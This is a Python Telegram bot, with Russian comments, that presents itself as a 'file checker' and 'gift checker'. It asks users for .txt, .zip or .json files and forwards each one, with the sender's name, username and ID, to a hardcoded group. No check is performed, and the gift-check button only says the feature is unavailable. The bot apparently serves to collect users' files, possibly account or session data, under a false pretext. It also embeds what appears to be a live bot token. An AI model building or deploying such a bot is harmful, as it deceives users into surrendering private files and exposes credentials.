import logging
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "8289924918:AAHKAWdWJzpa13La4mWe7jLwLtAmYtX44XU"
TARGET_GROUP_ID = "-1003171884825"  # Или ID группы: -1001234567890

# Создаем папку для временного хранения файлов
if not os.path.exists("temp_files"):
    os.makedirs("temp_files")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    keyboard = [
        [InlineKeyboardButton("📋 Инструкция", callback_data="instruction")],
        [InlineKeyboardButton("🎁 Проверить подарки", callback_data="check_gifts")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "👋 Добро пожаловать!\n\n"
        "Я бот для проверки файлов. Отправьте мне файлы формата .txt, .zip или .json" 
        "Выберите опцию ниже:"
    )
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик нажатий на кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "instruction":
        instruction_text = (
            "📋 ИНСТРУКЦИЯ:\n\n"
            "1. Отправьте боту файлы в формате:\n"
            "   • .txt - текстовые файлы\n"
            "   • .zip - архивные файлы\n"
            "   • .json - файлы данных\n\n"
            "2. Бот автоматически перешлет файлы в группу для провероки\n\n"
            "3. Используйте кнопку 'Проверить подарки' для проверки статуса\n\n"
            "4. Дождитесь результатов проверки от администраторов"
        )
        await query.edit_message_text(instruction_text)
        
    elif query.data == "check_gifts":
        check_text = (
            "🎁 ПРОВЕРКА ПОДАРКОВ\n\n"
            "Функция проверки подарков временно недоступна.\n"
            "Администраторы работают над обновлением системы.\n\n"
            "Для проверки статуса ваших файлов обратитесь к администратору группы."
        )
        await query.edit_message_text(check_text)

async def handle_documents(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик документов"""
    user = update.effective_user
    document = update.message.document
    
    # Проверяем расширение файла
    allowed_extensions = ['.txt', '.zip', '.json']
    file_extension = os.path.splitext(document.file_name)[1].lower()
    
    if file_extension not in allowed_extensions:
        await update.message.reply_text(
            "❌ Неподдерживаемый формат файла.\n"
            "Я принимаю только .txt, .zip и .json файлы."
        )
        return
    
    try:
        # Скачиваем файл
        file = await document.get_file()
        file_path = f"temp_files/{document.file_name}"
        await file.download_to_drive(file_path)
        
        # Подготавливаем сообщение для группы
        group_message = (
            f"📎 НОВЫЙ ФАЙЛ ДЛЯ ПРОВЕРКИ\n\n"
            f"👤 От: {user.first_name}"
            f"{f' (@{user.username})' if user.username else ''}\n"
            f"🆔 ID: {user.id}\n"
            f"📄 Файл: {document.file_name}\n"
            f"📏 Размер: {document.file_size} байт\n"
            f"🔍 Тип: {file_extension.upper()}"
        )
        
        # Отправляем файл в группу
        with open(file_path, 'rb') as file_obj:
            await context.bot.send_document(
                chat_id=TARGET_GROUP_ID,
                document=file_obj,
                caption=group_message,
                filename=document.file_name
            )
        
        # Уведомляем пользователя
        success_text = (
            f"✅ Файл '{document.file_name}' успешно отправлен на проверку!\n\n"
            f"📋 Статус: В обработке\n"
            f"⏳ Ожидайте результатов в группе"
        )
        await update.message.reply_text(success_text)
        
        # Удаляем временный файл
        os.remove(file_path)
        
    except Exception as e:
        logger.error(f"Ошибка при обработке файла: {e}")
        await update.message.reply_text(
            "❌ Произошла ошибка при обработке файла. Попробуйте позже."
        )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик текстовых сообщений"""
    text = update.message.text
    
    if text.startswith('/'):
        # Если это команда, которую мы не обрабатываем
        await update.message.reply_text("Используйте /start для начала работы")
    else:
        # Обычное текстовое сообщение
        keyboard = [
            [InlineKeyboardButton("📋 Инструкция", callback_data="instruction")],
            [InlineKeyboardButton("🎁 Проверить подарки", callback_data="check_gifts")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "Отправьте мне файл для проверки или выберите опцию:",
            reply_markup=reply_markup
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(msg="Exception while handling an update:", exc_info=context.error)

def main():
    """Основная функция"""
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Добавляем обработчики
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(handle_buttons))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_documents))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    # Обработчик ошибок
    application.add_error_handler(error_handler)
    
    # Запускаем бота
    print("Бот запущен...")
    application.run_polling()

if __name__ == "__main__":
    main()